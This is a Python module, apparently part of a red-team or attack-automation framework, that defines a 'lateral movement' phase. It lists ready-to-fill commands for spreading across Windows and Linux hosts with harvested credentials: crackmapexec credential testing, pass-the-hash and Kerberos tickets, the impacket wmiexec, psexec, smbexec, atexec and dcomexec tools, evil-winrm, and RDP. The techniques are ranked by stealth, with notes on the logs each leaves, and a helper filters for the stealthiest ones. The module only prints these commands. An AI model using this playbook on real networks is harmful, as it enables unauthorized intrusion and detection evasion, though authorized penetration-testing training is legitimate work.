"""
Phase 3: Lateral Movement
=========================

Move laterally across the network using harvested credentials.
"""

from typing import List, Dict

from .base import BasePhase
from ..models import Credential, CompromisedSystem


class LateralMovementPhase(BasePhase):
    """
    Phase 3: Lateral Movement

    Use harvested credentials to compromise additional systems.
    """

    PHASE_NUMBER = 3
    PHASE_NAME = "LATERAL MOVEMENT"
    PHASE_DESCRIPTION = "Move laterally using harvested credentials"

    # Credential testing methods
    TESTING_METHODS = [
        {
            "name": "NTLM Hash",
            "command": "crackmapexec smb <targets> -u <user> -H <hash>",
            "protocol": "SMB",
            "success_indicator": "Pwn3d!",
        },
        {
            "name": "Password",
            "command": "crackmapexec smb <targets> -u <user> -p <pass>",
            "protocol": "SMB",
            "success_indicator": "Pwn3d!",
        },
        {
            "name": "Kerberos Ticket",
            "command": "export KRB5CCNAME=ticket.ccache; crackmapexec smb <targets> -k",
            "protocol": "Kerberos",
            "success_indicator": "Pwn3d!",
        },
    ]

    # Lateral movement techniques (ordered by stealth)
    TECHNIQUES = [
        {
            "name": "WMI",
            "stealth": "HIGH",
            "command": "wmiexec.py domain/user:pass@target",
            "alt_command": "wmiexec.py -hashes :hash domain/user@target",
            "pros": "Uses legitimate Windows feature, minimal artifacts",
            "cons": "Requires WMI enabled, DCOM access",
            "artifacts": "WMI logs, DCOM traffic",
        },
        {
            "name": "PSRemoting/WinRM",
            "stealth": "HIGH",
            "command": "evil-winrm -i target -u user -p pass",
            "alt_command": "evil-winrm -i target -u user -H hash",
            "pros": "Legitimate PowerShell remoting, encrypted",
            "cons": "Requires WinRM enabled (TCP 5985/5986)",
            "artifacts": "PowerShell logs, WinRM logs",
        },
        {
            "name": "SMBExec",
            "stealth": "MEDIUM",
            "command": "smbexec.py domain/user:pass@target",
            "alt_command": "smbexec.py -hashes :hash domain/user@target",
            "pros": "No binary upload, uses native commands",
            "cons": "Creates temporary service",
            "artifacts": "Service creation logs, SMB traffic",
        },
        {
            "name": "PSExec",
            "stealth": "MEDIUM",
            "command": "psexec.py domain/user:pass@target",
            "alt_command": "psexec.py -hashes :hash domain/user@target",
            "pros": "Works almost everywhere, reliable",
            "cons": "Creates PSEXESVC service, well-known IOC",
            "artifacts": "PSEXESVC.exe, service logs",
        },
        {
            "name": "ATExec",
            "stealth": "MEDIUM",
            "command": "atexec.py domain/user:pass@target 'command'",
            "alt_command": "atexec.py -hashes :hash domain/user@target 'command'",
            "pros": "Uses scheduled tasks, no service creation",
            "cons": "Requires Task Scheduler access",
            "artifacts": "Scheduled task logs",
        },
        {
            "name": "DCOM",
            "stealth": "MEDIUM",
            "command": "dcomexec.py domain/user:pass@target",
            "alt_command": "dcomexec.py -hashes :hash domain/user@target",
            "pros": "Uses DCOM, less common",
            "cons": "Can be unstable",
            "artifacts": "DCOM logs",
        },
        {
            "name": "RDP",
            "stealth": "LOW",
            "command": "xfreerdp /v:target /u:user /p:pass",
            "alt_command": "xfreerdp /v:target /u:user /pth:hash",
            "pros": "Interactive access, full GUI",
            "cons": "Very visible, kicks off existing users, requires NLA consideration",
            "artifacts": "RDP logs, user logon events, terminal services logs",
        },
    ]

    # SSH techniques for Linux
    SSH_TECHNIQUES = [
        {
            "name": "SSH Key Authentication",
            "command": "ssh -i /path/to/key user@target",
            "stealth": "HIGH",
            "pros": "No password needed, encrypted",
            "cons": "Requires valid key",
        },
        {
            "name": "SSH Password Authentication",
            "command": "sshpass -p 'password' ssh user@target",
            "stealth": "MEDIUM",
            "pros": "Simple, works everywhere",
            "cons": "Password in command line (history)",
        },
    ]

    def execute(self, credentials: List[Credential], targets: List[str], **kwargs) -> List[CompromisedSystem]:
        """
        Execute lateral movement using harvested credentials.

        Args:
            credentials: List of credentials to test
            targets: List of target IPs/hostnames

        Returns:
            List of newly compromised systems
        """
        self.log_header()

        newly_compromised = []

        # Step 1: Enumerate targets
        self.log("\n[*] Step 1: Target Enumeration")
        self.log(f"    Targets to test: {len(targets)}")
        self.log(f"    Credentials available: {len(credentials)}")

        # Step 2: Test credentials
        self.log("\n[*] Step 2: Credential Testing")
        self._test_credentials(credentials, targets)

        # Step 3: Execute lateral movement
        self.log("\n[*] Step 3: Executing Lateral Movement")
        self._show_techniques()

        return newly_compromised

    def _test_credentials(self, credentials: List[Credential], targets: List[str]) -> None:
        """Test credentials against targets"""
        self.log("    Testing credentials with CrackMapExec...")

        for method in self.TESTING_METHODS:
            self.log(f"\n    Method: {method['name']}")
            self.log(f"    Command: {method['command']}")
            self.log(f"    Protocol: {method['protocol']}")
            self.log(f"    Success indicator: {method['success_indicator']}")

        self.log("\n    [*] Look for 'Pwn3d!' = Admin access on target")
        self.log("    [*] Look for '+' = Valid credentials (may not be admin)")

    def _show_techniques(self) -> None:
        """Display available lateral movement techniques"""
        self.log("\n    Lateral Movement Techniques (ordered by stealth):")

        for tech in self.TECHNIQUES:
            self.log(f"\n    {tech['name']} (Stealth: {tech['stealth']})")
            self.log(f"      Command: {tech['command']}")
            self.log(f"      With hash: {tech['alt_command']}")
            self.log(f"      Pros: {tech['pros']}")
            self.log(f"      Cons: {tech['cons']}")
            self.log(f"      Artifacts: {tech['artifacts']}")

        self.log("\n    SSH Techniques (for Linux targets):")
        for tech in self.SSH_TECHNIQUES:
            self.log(f"\n    {tech['name']} (Stealth: {tech['stealth']})")
            self.log(f"      Command: {tech['command']}")
            self.log(f"      Pros: {tech['pros']}")
            self.log(f"      Cons: {tech['cons']}")

    def get_technique_by_stealth(self, min_stealth: str = "LOW") -> List[Dict]:
        """
        Get techniques filtered by minimum stealth level.

        Args:
            min_stealth: Minimum stealth level (LOW, MEDIUM, HIGH)

        Returns:
            List of techniques meeting the stealth requirement
        """
        stealth_order = {"HIGH": 3, "MEDIUM": 2, "LOW": 1}
        min_level = stealth_order.get(min_stealth, 1)

        return [
            t for t in self.TECHNIQUES
            if stealth_order.get(t["stealth"], 1) >= min_level
        ]

    def get_technique_by_name(self, name: str) -> Dict:
        """Get a specific technique by name"""
        for tech in self.TECHNIQUES:
            if tech["name"].lower() == name.lower():
                return tech
        return {}